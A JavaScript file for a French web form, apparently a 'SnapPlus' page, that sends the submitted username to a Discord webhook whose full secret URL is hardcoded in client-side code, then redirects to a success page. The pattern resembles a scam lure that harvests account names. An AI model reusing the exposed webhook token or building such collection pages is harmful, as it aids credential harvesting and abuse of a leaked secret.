const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536105952720330752/XsDrxHH4dWxbBcT4EgA4zP42BlF5bFYSbOVDAUaQbm83D15HTrfifVL-FwGEyhoXlUCC";

const form = document.getElementById("pseudoForm");
const pseudoInput = document.getElementById("pseudo");
const submitButton = document.getElementById("submitButton");
const errorMessage = document.getElementById("errorMessage");

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const pseudo = pseudoInput.value.trim();

  errorMessage.textContent = "";

  if (pseudo.length < 2) {
    errorMessage.textContent =
      "Ton pseudo doit contenir au moins 2 caractères.";
    return;
  }

  submitButton.disabled = true;
  submitButton.querySelector(".button-text").textContent = "Envoi…";

  try {
    console.log("Pseudo envoyé :", pseudo);

    const response = await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `📸 Nouveau pseudo SnapPlus : **${pseudo}**`
      })
    });

    console.log("Statut Discord :", response.status);
    console.log("Réponse Discord :", await response.text());

    if (!response.ok) {
      throw new Error(`Discord a répondu avec HTTP ${response.status}`);
    }

    window.location.href = "success.html";

  } catch (error) {
    console.error("Erreur complète :", error);

    errorMessage.textContent =
      "L'envoi vers Discord a échoué. Ouvre la console du navigateur pour voir l'erreur.";

    submitButton.disabled = false;
    submitButton.querySelector(".button-text").textContent =
      "Continuer →";
  }
});
